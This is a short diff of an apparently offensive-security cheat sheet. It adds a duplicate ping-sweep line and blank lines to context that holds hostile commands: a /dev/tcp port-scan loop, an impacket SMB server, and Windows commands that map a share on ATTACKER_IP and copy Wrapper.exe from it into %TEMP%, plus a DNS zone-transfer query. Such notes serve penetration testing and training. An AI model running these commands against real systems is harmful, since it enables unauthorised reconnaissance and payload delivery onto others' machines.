@@ -70,6 +70,7 @@
 
 ## Ping and Port Scanning
 -  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+   -  for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 -  
 -  ports: for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 
@@ -171,6 +172,8 @@
   -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
   -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+
+
 ## DNS, SMB, SNMP
 - dig
   - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
